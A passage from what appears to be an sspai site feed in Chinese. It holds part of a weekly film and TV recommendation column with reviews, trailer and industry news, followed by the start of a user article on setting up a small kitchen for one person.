SB」之间转换，他去试驾拖拉机，大家建议买芬特，他却买了兰博基尼拖拉机（没错！兰博基尼竟然有拖拉机🚜），虽然拉风但一点也不好用，甚至因为块头太大还得新建谷仓和车道；买了无人机驱赶羊群，结果根本拦不住兴奋乱窜的羊；状况频频发生，却也是笑点来源。</p>\n<p>两位助手也个性的很，他们有着专业的知识和精准的判断，查理是土地经纪人，兼农学家、财务专家和律师于一身，每次都带着坏消息来；卡勒布是一位勤快幽默的农用机械大师，是杰瑞米的技术指导和工作伙伴。而到年终，暴躁大猩猩杰瑞米辛苦一年，在田间地头灰头土脸赶羊喂鸡，却只赚了 144 镑，简直像极了「戴月荷锄归」还依旧「草盛豆苗稀」的陶渊明，网友戏称这部片子为「开猩农场」，真的很好笑了！</p>\n<h3>[港剧] 刑侦日记</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/648af625a6e7c683128780cea0877103\"></figure><p>关键词：犯罪 / 悬疑</p>\n<p>片长：45 分钟（单集）× 25 集；<a href=\"https://movie.douban.com/subject/35073682/\">豆瓣链接</a></p>\n<blockquote><p>喂？是精神病院吗？你们院最近的好像跑出很多病人。</p></blockquote>\n<p>@潘誉晗：因为目击到母亲杨碧芯（惠英红饰）精神分裂的现场，惊吓过度的儿子叶劲峰（王浩信饰）也分裂出了另一人格。成年之后的叶劲峰作为卧底探员加入某组织，但又碰上了双重爆炸案，因此结识了拆弹组之花游雁星（黄智雯饰）。同时，叶劲峰的妹妹叶朗晴成为了连环血字谋杀案的唯一幸存者，而这次的侥幸逃生又让叶朗晴住进了精神病院……疯子与疯子的对决就这样开始了。</p>\n<p>无论是从口碑还是剧集评分来看，《刑侦日记》可以看作是今年犯罪类型港剧的最佳。看多了「全员恶人」的设定，这种「全员不正常」的类型也颇为带感。双线叙事的节奏下慢慢牵扯出了更多细节，现在已经播到第 11 集了，似乎一个案子都没有解决，但是演员们的精彩演技又吸引观众不自主地看下去，尤其是惠英红饰演的杨碧芯，完美诠释了什么叫「川剧变脸」，前一秒对着女儿还是一脸慈爱，下一秒眼神中的冷冽立刻让人毛骨悚然，是一部夏季纳凉的绝佳新剧。</p>\n<h3>[台剧] <strong>第三布局 尘沙惑</strong>\n</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/42e51b921ff15237a8ff8b48ed12dd49\"></figure><p>关键词：剧情 / 悬疑 / 犯罪</p>\n<p>片长：60 分钟（单集）× 15 集；<a href=\"https://movie.douban.com/subject/35161094/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：剧中庄凯勋饰演年轻有为的民意代表杨启逍，接手父亲旅馆生意，游走黑白两道。张榕容饰演的徐梓薇因公受伤破格升职，转调为刑事警察。一起移工脱逃案意外牵扯出分尸案，徐梓薇与刘冠廷饰演的菜鸟警察陈家豪私下调查，怀疑与毒蛇集团有关。没想到早在 3 年前两人的命运就因一桩挟持案陷入纠缠……宛如罗生门般的破案过程，让所有人不知不觉走入了某人精心策划的「布局」之中。剧中案件涉及的时间长达 23 年，漫长的时间与许多未愈合的心理伤口，在不同角色的内在豢养出各自的心魔。</p>\n<p>全剧灵感源自佛教经典中「破尘沙」的概念，导演洪伯豪将人世间的种种烦恼比喻为尘沙，唯有破除了宛如尘沙一般的疑惑，人们才有机会放下心中执念。剧情的主旋律也以英国经济学家海耶克的那句「通往地狱的路，都是由善意铺成的」为基调。</p>\n<p>虽然是一部台剧，但叙事手法很 HBO，三起凶杀案将三条叙事线串联为一条主线，三个主角的性格也颇为丰满，对正义与真相锲而不舍的女警官、指日可待的政治新星、社会经验丰富的年轻警察，这样的组合也产生了奇妙的化学反应，剧情关注的社会议题如妇幼、x 工作者等也的确需要更多的社会讨论度。</p>\n<h3>[电影] 夏日友晴天</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/ca6ee32f3f18c45c05fe5df978372772\"></figure><p>关键词： 喜剧 / 动画 / 奇幻 / 冒险</p>\n<p>片长：95 分钟（单集）；<a href=\"https://movie.douban.com/subject/35161768/\">豆瓣链接</a></p>\n<blockquote><p>我们菜鸟，就应该互相帮助不是吗～</p></blockquote>\n<p>@潘誉晗：性格内向的小海怪卢卡一直被告知要离海面远远的，但是当他结识了小伙伴阿尔贝托之后，一切都变了。阿尔贝托是一个性格外向的海怪，一向独立自由的他非常热情也很奔放，他带着卢卡见世面，不仅把脑袋探出了海面走上了海岸，更是来到了人类生活的小镇。在这里，他们又结识了人类朋友朱莉娅，一起进行愉快地冒险。只不过卢卡和阿尔贝托要加倍小心，他们是不被人类待见的海怪，而人类一旦知道他们的真实身份，他们就可能因此受到伤害。</p>\n<p>真的可以永远相信迪士尼和皮克斯。碧海、蓝天、阳光、少年，一切都太美好了。大概是因为导演把自己童年记忆中的美丽小镇复制到电影中的关系，所以意大利的美丽风景即使被二次元化也依然很有魅力，而如此明媚风光下的友情也因充满色彩感的靓丽画面显得更加熠熠闪耀。除此之外，配音演员的选择也很贴合，给卢卡配音的小演员是在《房间》中有着精彩演出的雅各布·特伦布莱，性格外放的阿尔贝托则由扮演过沙赞好朋友的杰克·迪伦·格雷泽出演，两个小朋友的精彩演出也给本片增加了一大看点。</p>\n<h3>[纪录片] 你看不见的我</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/b735b05659fa90332e9b7c5e0c5a44c4\"></figure><p>关键词：纪录片</p>\n<p>片长：60 分钟（单集）× 5 集；<a href=\"https://movie.douban.com/subject/35458031/\">豆瓣链接</a></p>\n<blockquote><p>It is an open wound, but inside.</p></blockquote>\n<p>@宇宙浪费指南：Apple TV+ 纪录剧集《你看不见的我》由奥普拉·温弗瑞、哈里王子联合监制，嘉宾包括 Lady Gaga、格伦·克洛斯、德玛尔·德罗赞等，奥普拉、哈里王子与嘉宾们就心理健康问题展开讨论，嘉宾们分享自己的故事，揭开心理健康和情感健康的面纱。</p>\n<p>这是个颇具意义的节目，在我们每个人都为疫情受困之际，心灵都因为这场劫难遭受冲击，尽管身处不同的环境，感受到的煎熬、痛楚和悲伤却是一样的。当下或许是将心理疾病正名化的最佳时机，众多大咖坐镇的阵容会带来更多的关注度。Lady Gaga 在首集中说出了自己的痛苦回忆，希望让更多人关注并理解。片子里同样出现了来自世界各地、不同种族、不同阶级、不同行业的人、小众群体，当看到从叙利亚逃到希腊的难民小朋友时，真的破防了，从战争中幸存下来，穿过大海，乘坐一只小船，尝试过三次危险的路程……真的很少有这样的节目会关注到难民这样一个特殊群体的心理健康。</p>\n<p>每集的标题或许是节目给出的解决办法：「Say It Out Loud」、「Asking For Help」、「Finding What Works」、「We Need Each Other」……希望正在经历的朋友可以在与自己的心灵的斗争中穿越大海，做一个英雄；希望对焦虑、抑郁病症有误解的人可以倾听并理解。</p>\n<h3>✌️更多</h3>\n<ul>\n<li>\n<a href=\"https://movie.douban.com/subject/35211524/\">[韩剧] 明天不要来</a> @Voyager_1：该剧讲述来自世界各地的学生入住韩国的大学宿舍期间发生的一系列情景喜剧故事。虽然第一集看到一堆老外操着流利的韩语有些奇怪，但看到几个 HAHA 的搞笑镜头以及丢伞的夸张反转情节还是让人笑掉大牙，轻松愉快的大学生活，每个人都有特殊的设定，剧情活泼又逗乐，这样的情景剧谁不爱呢。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35116814/\">[南非] 跳吧！我就是舞后</a> @Voyager_1：来自南非的这部剧，光看到主角的跳舞画面就觉得活力满满想要看完这部剧。开头就用一个片段和对白昭示了社会性别分工以及热爱与工作不能两全的现状，让人更加关注这部舞蹈剧背后的内涵。我们都知道主角一定通过跳舞改变了命运，但观众更想知道的是热爱可以带来什么，看这部剧你就能知道。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35472119/\">[纪录片]隐秘的细节</a> @潘誉晗：历史，就是为了政治服务的。河南卫视这一次出品的纪录片，很敢拍也很敢说，从另外一个我们不太注意的角度去剖析历史，分析历史长河中那些存在为什么诞生的理由，角度很新也很严肃，因为找的嘉宾也都是文化届的人士，所以科普论证时都很像是学者发言，大概也是因为这个原因，所以稍显冷门。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/34882900/\">[美剧]邪恶 第二季</a> @潘誉晗：《傲骨贤妻》主创团队制作的《邪恶》第二季在烂番茄收获了 92% 的好评。因为走的是超自然现象的悬疑剧类型，所以第二季依然维持了首季那种怪谲诡异的风格，喜欢的朋友会很喜欢，有点胆小的伙伴会有点小惊吓。但是这种每集小故事再贯穿大阴谋的类型，还是很受一部分观众的欢迎。爱默生饰演的法医相当出彩。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35208525/\">[动画] 水果篮子 最终季</a> @SHY：近几年的一系列「童年回忆」重启，几乎成了毁原作的代名词，不被粉丝寄刀片就称得上平稳落地了。2019 年开始的《水果篮子》全篇动画企划是极少见的特例，经费充裕，主创用心，虽然仍有不少情节被删减，故事主干却完全秉承漫画原作，踏踏实实改编完五个季度。即使不带情怀滤镜，也是相当精致的少女漫改动画，有观看的价值。</li>\n</ul>\n<h2>📅 本周新预告</h2>\n<h3>漫威新片《尚气与十环传奇》发布全新中字预告</h3> <p>6 月 25 日，漫威新片《尚气与十环传奇》发布全新中字预告。该片由德斯汀·克里顿执导，刘思慕、梁朝伟、奥卡菲娜、张梦儿、杨紫琼、陈法拉、钱信伊、弗罗里安·穆特鲁等主演，将于 9 月 3 日北美上映。</p>\n<h3>全智贤主演《王国：北方的阿信》7 月 23 日上线 Netflix</h3> <p>6 月 22 日，全智贤主演的《王国》系列外传《王国：北方的阿信》发布中字先导预告。该剧由第一季导演金成勋执导，《王国》编剧金恩熙打造，将于 7 月 23 日上线 Netflix。</p>\n<h3>Netflix 约会类真人秀《性感野兽》7 月 21 日开播</h3> <p>6 月 24 日，约会类真人秀《性感野兽》发布正式预告。在该节目中，男女嘉宾都将佩戴面具或化妆为野兽进行约会，嘉宾只有在对潜在追求者做出最终决定时，才会卸下野兽面具与妆容。该节目将于 7 月 21 日登陆 Netflix。</p>\n<h3>新冠肺炎疫情防控改编电影《中国医生》发布预告，官宣定档 7 月 9 日</h3> <p>6 月 22 日，影片由刘伟强执导，刘伟强、李锦文共同监制，张涵予、袁泉、朱亚文、李晨、易烊千玺、欧豪等出演，讲述以武汉市金银潭医院为核心背景，张涵予、袁泉等演员饰演的医务工作者们面对未知的战场，抗疫救人的动人故事。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV17g4113726?from=search&amp;seid=17215232184881696722\" target=\"_blank\"><strong>《特种部队：蛇眼起源》首曝官方中字预告：</strong></a>《特种部队》衍生电影《特种部队：蛇眼起源》发布官方中字正式预告。该片由罗伯特·斯文克执导，埃文·斯彼里奥托普洛斯操刀剧本，亨利·戈尔丁、安德鲁·浩二、萨玛拉·维文、乌苏拉·科尔维罗等主演，将于 7 月 23 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Lo4y1C7hd?from=search&amp;seid=8539485269179284911\" target=\"_blank\"><strong>Hulu 剧集《大楼里只有谋杀》8 月 31 日开播：</strong></a>史蒂夫·马丁、马丁·肖特、赛琳娜·戈麦斯主演的剧集《大楼里只有谋杀》发布先导预告。该剧讲述三个对真实犯罪有着共同痴迷的陌生人，突然发现自己被卷入其中的故事，将于 8 月 31 日 Hulu 开播。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1yw411o7EG?from=search&amp;seid=12392636691525539364\" target=\"_blank\"><strong>动画电影《欢乐好声音 2》首爆预告：</strong></a>动画电影《欢乐好声音 2》发布首款预告。前作导演加斯·詹宁斯及配音演员马修·麦康纳、瑞茜·威瑟斯彭、斯嘉丽·约翰逊、塔伦·埃哲顿、托瑞·凯利回归。该片将于 12 月 22 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1PM4y1g7N7?from=search&amp;seid=15025052001486351292\" target=\"_blank\"><strong>新版《糖果人》发布全新预告，8 月 27 日北美上映：</strong></a>由尼娅·达科斯塔执导，叶海亚·阿卜杜勒-迈丁、泰柔娜·派丽丝、科尔曼·多明戈主演的新版《糖果人》发布全新预告。该片翻拍自 1992 年同名恐怖片，将于 8 月 27 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1i5411T7mw?from=search&amp;seid=16806507264350279775\" target=\"_blank\"><strong>《X 特遣队：全员集结》8 月 6 日同步登陆北美院线及 HBO Max：</strong></a>詹姆斯·古恩执导的《X 特遣队：全员集结》发布新预告，该片定级为 R 级，将于 8 月 6 日同步登陆北美院线及 HBO Max。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Tg41137oa?p=1\" target=\"_blank\"><strong>柯震东、曾美慧孜、白宇帆、林哲熹主演电影《寻找》发布首款预告：</strong></a>由陈熠霖执导，柯震东、曾美慧孜、白宇帆、林哲熹主演的电影《寻找》发布首款预告。该片已入围第 74 届戛纳电影节「一种关注」单元。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1f44y1B73k?from=search&amp;seid=4808067255126072240\" target=\"_blank\"><strong>《月光光心慌慌：杀戮》发布正式预告：</strong></a>由大卫·戈登·格林执导，杰米·李·柯蒂斯、朱迪·格雷尔等主演的《月光光心慌慌：杀戮》发布正式预告。该片将于 10 月 15 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV12X4y1A7dv?from=search&amp;seid=3343851020873642086\" target=\"_blank\"><strong>Netflix 泰国惊悚片《安眠实验》中字预告：</strong></a>Netflix 泰国惊悚影片《安眠实验》发布中字预告。故事讲述 4 位青年参加了新药测试，试药后睡着 60 秒就会有生命危险，但是伴随高风险的还有高收益——保持半个月不入睡，即可获得 100W 泰铢。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Wo4y1k75U?from=search&amp;seid=11639242803680606402\" target=\"_blank\"><strong>《猎魔人》第二季发布全新预告：</strong></a>亨利·卡维尔、 弗蕾娅·艾伦、安亚·查洛特拉、克里斯托弗·海维尤、亚森·阿图、保罗·布林、金·波德尼亚等主演的《猎魔人》第二季发布全新预告。该剧改编自波兰奇幻小说家安杰·萨普科夫斯基的同名小说，故事将围绕一个孤独的猎魔人杰洛特展开。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1C64y1r7n1?from=search&amp;seid=903930917181041221\" target=\"_blank\"><strong>莱奥·卡拉克斯新作《安妮特》8 月 20 日上线亚马逊：</strong></a>由莱奥·卡拉克斯执导，亚当·德赖弗、玛丽昂·歌迪亚主演的音乐爱情电影《安妮特》发布新预告，8 月 20 日上线亚马逊。该片已入围本届戛纳电影节主竞赛单元，并将担任开幕片。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1pU4y1G7YB?from=search&amp;seid=13907694198960398514\" target=\"_blank\"><strong>Netflix 韩国驱魔恐怖片《第八天之夜》：</strong></a>Netflix 发布韩国最新悬疑恐怖片《第八天之夜》正式中字预告，聚焦讲述韩国最可怕的招灵故事。本片融合了惊悚、悬疑、恐怖等元素，由金裕贞、李星民、朴海俊、南多凛等主演，将于 7 月 2 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Fh411Y7MA?from=search&amp;seid=12002065644759725982\" target=\"_blank\"><strong>Netflix 校园喜剧《好想做一次》发布第 2 季预告：</strong></a>青春校园恋爱喜剧《好想做一次》第 2 季首曝中字预告，麦特里伊·拉玛克里斯南回归主演。上一季为找到男友而疯狂开脑洞的印度裔美国女孩 Devi，这次面临的是状况更加复杂。</p>\n<p><a href=\"https://www.bilibili.com/video/BV19h41187mN\"><strong>TV 动画《瓦尼塔斯的手札》公布预告，7 月开始播出：</strong></a>漫改 TV 动画《瓦尼塔斯的手札》公布了正式预告，板村智幸执导，赤尾凸系构，BONES 制作，2021 年 7 月开始播出。本作改编自望月淳的同名漫画，青年吸血鬼诺亚意外结识持有被诅咒魔导书的人类医生瓦尼塔斯，两人共同前进、收获和失去，直至在旅途终点将对方亲手杀死为止。</p>\n<p><a href=\"https://www.bilibili.com/video/BV135411u7tW?from=search&amp;seid=17606003418352229027\" target=\"_blank\"><strong>Netflix 纪录片《爱猫之人》释出正式预告</strong></a>：该片探讨了人类与猫咪之间迷人的关系，同时揭示了与这些强烈独立的神秘生物建立深厚关系的原因，该片将于 7 月 7 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Jy4y1g7z3?from=search&amp;seid=16088003451929988290\" target=\"_blank\"><strong>《维和防暴队》发布先导预告</strong></a>：本片由影片由刘伟强监制，李达超执导，黄景瑜、王一博、钟楚曦、张哲瀚、谷嘉诚、赵华为等出演，讲述中国维和警察防暴队头戴蓝盔，展开一次次惊心动魄的维和作战行动。本片将于 2022 年上映。</p>\n<p><a href=\"http://t.cn/A6VsRcFO\" target=\"_blank\"><strong>Netflix 瑞典剧集《青春王室》发布正式预告</strong></a>：故事聚焦一个年轻的王子卸下王室义务，却意外地成为了头号王位继承人的故事。该剧由英格拉·奥尔森、克里斯蒂安·希尔伯格等主演，将于 7 月 1 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1A64y1b747\" target=\"_blank\"><strong>漫改真人电影《辉夜大小姐想让我告白》第二部：</strong></a>改编自赤坂明的同名漫画，河合勇人执导，徳永友一编剧，平野紫耀、桥本环奈、浅川梨奈等主演，2021 年 8 月 20 日在日本上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1MV411x784\" target=\"_blank\"><strong>剧场版动画《Fate/kaleid liner 魔法少女☆伊莉雅 Licht 无名的少女》：</strong></a>改编自 TYPE-MOON 原作、广山弘作画的同名漫画，大沼心执导，SILVER LINK. 制作，8 月 27 日在日本上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1af4y1t7gE\" target=\"_blank\"><strong>动画电影《扶桑花之舞》：</strong></a>水岛精二担任总导演，绵田慎也共同执导，吉田玲子编剧，以福岛县磐城市为舞台，主角夏凪日羽与朋友们为当上扶桑花女孩而努力，2021 年 12 月 3 日在日本上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1cV411x7a7\" target=\"_blank\"><strong>剧改 TV 动画《NIGHT HEAD 2041》：</strong></a>改编自 1992 年播出的经典日剧《暗夜第六感》，原作者饭田让治担当系列构成、编剧，平川孝充执导，白组制作，7 月 14 日开始播出。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1G54y1H7Rc\" target=\"_blank\"><strong>漫改 TV 动画《女友成堆》：</strong></a>改编自弘幸的同名漫画，桑原智执导，手冢制作，7 月开始播出。向井直也与从小就喜欢的佐木咲成功交往后，又收到同学水濑渚的告白，决定三人同行。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>刘德华确认出演《流浪地球 2》</h3>\n<p>6 月 18 日，刘德华在直播中透露，他将出演《流浪地球 2》。该片由郭帆执导，刘慈欣监制，将于 2023 年大年初一中国内地上映。</p>\n<h3>罗泓轸编剧并担任制片人的新片《灵媒》发布海报</h3>\n<p>6 月 22 日，泰国导演班庄·比辛达拿刚执导，韩国导演罗泓轸编剧并担任制片人的电影《灵媒》发布海报。该片是一部萨满教题材的恐怖片，讲述泰国乡村里一个受神启示世代相传的巫师家族三个月发生的故事，将于 7 月 14 日韩国上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/1f0eb5854feb9edfad2ac6b1ff011835\"></figure><h3>《性爱自修室》第三季 9 月 17 日上线 Netflix</h3>\n<p>6 月 24 日，《性爱自修室》第三季发布剧照。第三季由阿萨·巴特菲尔德、吉莲·安德森、艾玛·麦基、舒提·盖特瓦、康纳·斯温德尔、艾米·卢·伍德、凯达·威廉姆斯特灵等主演。本季共 8 集，将于 9 月 17 日上线 Netflix。</p>\n<h3>《美国恐怖故事集》7 月 15 日开播</h3>\n<p>6 月 22 日，《美国恐怖故事》衍生剧集《美国恐怖故事集》发布全新海报。该剧包括多集长 1 小时的独立完整故事，将于 7 月 15 日开播。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/306ab2252da759400b577c7ebb75e578\"></figure><h3>Hulu 正式宣布续订《外星也难民》第四季</h3>\n<p>6 月 2 日，Hulu 正式宣布续订《外星也难民》第四季。该剧围绕四名在地球上生活的外星人展开。第三季将于 2022 年开播。</p>\n<h3>更多</h3>\n<p><strong>第 74 届戛纳电影节主竞赛评审团阵容官宣：</strong>第 74 届戛纳电影节主竞赛单元评审团成员揭晓：玛吉·吉伦哈尔、梅拉尼·罗兰、宋康昊、塔哈·拉希姆、玛缇·迪欧普、杰茜卡·豪丝娜、小克莱伯·门多萨、玛莲·法莫。斯派克·李担任评审团主席。本届戛纳电影节将于 7 月 6 日—17 日举行。</p>\n<p><strong>动作惊悚片《火药奶昔》发布全新海报：</strong>由亚伦·凯沙勒斯、诺瓦特·帕普沙多执导，凯伦·吉兰、琳娜·海蒂、杨紫琼、 安吉拉·贝塞特等主演的电影《火药奶昔》发布全新海报。该片将于 7 月 14 日在 Netflix 美国上线，其他国家地区暑期上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/f6f7e5a36586b0bee6e857dc867d43d2\"></figure><p><strong>木村拓哉、长泽雅美主演《假面之夜》发布首款海报：</strong>根据东野圭吾小说改编，由铃木雅之执导，木村拓哉、长泽雅美主演的《假面之夜》发布首款海报。该片为《假面饭店》的续集，将于 9 月 17 日日本上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/72670bfbf0178ba79c8ca49a1adf8961\"></figure><p><strong>《生吃》导演朱利亚·迪库诺自编自导新片《钛》发布海报：</strong>《生吃》演朱利亚·迪库诺自编自导的第二部长片《钛》发布正式海报。该片已入围第 74 届戛纳电影节主竞赛单元，并将于 7 月 14 日法国上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/d5fdc144518a25825a9192b2a09a855e\"></figure><p><strong>《我的天才女友》第三季首发剧照：</strong>《我的天才女友》第三季首发剧照。本季改编自埃琳娜·费兰特撰写的「那不勒斯四部曲」中的第三部《离开的，留下的》，由丹尼埃莱·卢凯蒂执导，盖娅·吉拉切、玛格丽塔·马祖可回归出演，将于 2022 年开播。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/25/article/30c8f020d2590fbc4b28633eafaf15c3\"></figure><p><strong>Netflix 官宣韩影《首尔大作战》演员阵容：</strong>Netflix 正式官宣犯罪动作商业片《首尔大作战》演员阵容：刘亚仁、高庚杓、李奎炯、朴柱炫、邕圣祐、金成钧、郑雄仁、文素利。影片以 1988 年汉城奥运会为背景，讲述上溪洞的车手们盗取 VIP 秘密资金的故事，计划 2022 年上映。</p>\n<p><strong>漫改 TV 动画《街角魔族》第二季 2022 年 4 月开始播出：</strong>漫改 TV 动画《街角魔族》第二季定于 2022 年 4 月开始在 TBS 电视台播出，本作改编自伊藤出云的同名漫画，樱井弘明执导，J.C.STAFF 制作，第一季 2019 年 7 月播出。因家庭原因觉醒为魔族的少女吉田优子，为解除诅咒向退役魔法少女千代田桃发起挑战。 <a href=\"https://twitter.com/machikado_staff/status/1407987144447115266\" target=\"_blank\">来源</a></p>\n<p><strong>轻改 TV 动画《幼女战记》第二季：</strong>改编自 Carlo Zen 的同名轻小说，上村泰执导，NUT 制作，主角因得罪神灵转生为弃婴谭雅，在战火肆虐的异世界征战，TV 动画第一季 2017 年播出。 <a href=\"https://twitter.com/youjosenki/status/1406235566383910915\" target=\"_blank\">来源</a></p>\n<p><strong>《最终幻想 9》动画版：</strong>日本游戏公司 Square Enix 正与法国动画工作室 Cyber Group Studios 合作，将游戏《最终幻想 9》改编为动画剧集，面向 8 至 13 岁儿童，上线时间待定。 <a href=\"https://kidscreen.com/2021/06/21/cyber-group-lines-up-final-fantasy-ix-series/\" target=\"_blank\">来源</a></p>\n<p><strong>舒淇、白客主演的新片《寻她》在万达之夜曝光：</strong>本片由青年导演陈仕忠执导，讲述勇敢的岭南母亲寻找女儿也寻找自己的故事。舒淇在片中扮演一个独立勇敢的女性，在一次追寻真相的旅程中也拉开了作为女性自我觉醒的帷幕。</p>\n<p>👉🏻 <strong>你可能错过：</strong><a href=\"https://sspai.com/post/67265\">看什么 · 特别篇丨比博燃的热血片单，陪你迎战郁热夏天</a> <br><strong> </strong><a href=\"https://sspai.com/post/66840\" target=\"_blank\">看什么 · 特别篇丨一张带你环游世界的夏日片单</a></p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/67421"},{"title":"独居如何享受烹饪乐趣：我的厨房搭建经验分享","date":"2021-06-25 08:15:16","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>去年夏天毕业后，开启了一人的独居生活，租的房子是房东刚刚装修好的，设备很新而且齐全。小户型，建筑面积只有 44 平，有一个精致的小厨房。入住之后，激情澎湃地开始疯狂布置、添置小物件。厨房顺其自然地成为了布置的重点之一。</p>\n<figure class=\"ss-imgRows\" figcaption=\"我的小厨房 | 左边为刚布置的时候，右边是现在的样子\"><img src=\"https://cdn.sspai.com/2021/06/08/d2eb4b1f0b58d2e0ac3b6c667e7824af.JPG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/08/7cc1ba42bd2ecd7c54d86af68719696f.jpg\" alt=\"\"></figure><h2>新晋独居青年的厨房捣鼓欲</h2>\n<p>在综合考虑自己做饭更健康、少吃外卖以及相对省钱的因素之后，作为厨房小白的我迫不及待地开启了新晋厨师的生活。并以此打开了购物欲，一股脑地购入了一系列锅碗瓢盆、油盐酱醋，添置了一些收纳和厨具，后来被证实哪些是基础必备的，哪些是头脑发热冲动消费的，哪些是鸡肋的。</p>\n<p>结合<strong>「厨房小」、「一人食」</strong>两个特点的基础上，并经过一年的体验，我逐渐总结出了<strong>一套简单直接的、适合租房使用的、追求性价比的「独居青年如何快速成为厨房小当家的不完全指南」。</strong>另外，本篇文章可扩大适用于为 1-3 人。</p>\n<p>本篇文章就我<strong>「目前厨房正使用的工具」</strong>及其<strong>「优缺点」</strong>进行介绍，希望大家能从中获得布置厨房的小启发。</p>\n<p><strong>目录介绍</strong></p>\n<ul>\n<li>我需要什么厨具家电</li>\n<li>碗碟与刀具</li>\n<li>好用但容易遗忘的好物</li>\n<li>厨房收纳大法好</li>\n<li>那么问题来了：我不会做饭啊</li>\n</ul>\n<h2><strong>我需要什么厨具家电</strong></h2>\n<p>小家电、厨具是厨房中的主角，这里自动认定厨房带有冰箱，所以这里不再列明冰箱。一起来看看哪些是必备的吧。</p>\n<h3><strong>01 电高压锅 |「蒸饭和煮粥」</strong></h3>\n<blockquote><p>别买电饭煲了，买电高压锅吧，还能煮粥煲汤呢。</p></blockquote>\n<p>作为一个碳水米饭爱好者，煮饭工具纳入 TOP1 购买清单。本来在反复纠结买哪一款电饭煲，一问朋友，朋友一语惊醒梦中小白。在不过于苛求米饭的口感的前提下，我果断选择了性价比高的电高压锅，并且锁定了适合 1-3 人饭量的 2.5L 小电高压锅（5L 太大，购买时注意分清），最终购入下面这款。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/03/f38868740fe582c5b0d04951cb9d4a73.jpg\"><figcaption><strong>美的 2.5L 电压力锅 25A1</strong> | 参考价：269RMB</figcaption></figure><ul><li><strong>优点：</strong></li></ul>\n<ol>\n<li>\n<strong>真的可以只煮一个人一餐的米饭</strong> | 60-70ml，1:1 的水，几乎没有锅巴，一个人吃一餐（在不想吃隔夜饭的前提下）。</li>\n<li>\n<strong>功能面板一目了然</strong> | 5 秒直接上手，该煮饭煮饭，该煮粥煮粥。</li>\n<li>\n<strong>可预约时间 |</strong> 作为第二天要带便当去上班的打工人来说非常友好，提前一天晚上淘好米，设置定时。早晨起床时饭已经煮好了。（譬如，今天晚上 22:30 装好米，设置 8:30h 后自动煮饭，也就是第二天早上 7:00 开始煮饭，1-2 个人的米饭量大概 15-20 分钟就能煮好，很迅速。）</li>\n<li>\n<strong>可保温 |</strong> 大部分电高压锅都能做到，老式高压锅则可能存在不能保温的问题。这一点很重要，不必刻意计算开饭时间，米饭都可以作为第一步先蒸上，不论何时开饭，都是热腾腾的。</li>\n<li>\n<strong>功能全面</strong> | 除了煮饭，我还经常用来煮粥，这款有个叫「宝宝粥」的功能，我用来煮绿豆、红豆粥，可以煮的很烂。除此之外，还用来熬过骨头汤，用电高压锅压一下，骨头会烂很多。</li>\n</ol>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/be25c42b9b970eef4ea2844771e5e5bd.jpg\"><figcaption>普通熬粥模式下，红豆压得不够烂 | 